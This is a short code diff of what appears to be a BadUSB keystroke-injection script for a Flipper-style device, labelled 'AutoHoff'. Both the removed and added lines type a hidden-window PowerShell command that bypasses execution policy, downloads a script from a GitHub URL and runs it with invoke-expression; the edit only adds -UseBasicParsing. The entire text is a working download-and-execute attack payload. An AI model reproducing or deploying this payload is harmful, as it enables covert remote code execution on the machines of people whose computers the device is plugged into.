@@ -13,6 +13,6 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/kaeus/flipper-fun/main/AutoHoff/AutoHoff.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/kaeus/flipper-fun/main/AutoHoff/AutoHoff.ps1?dl=1 -UseBasicParsing; invoke-expression $pl
 DELAY 500
 ENTER
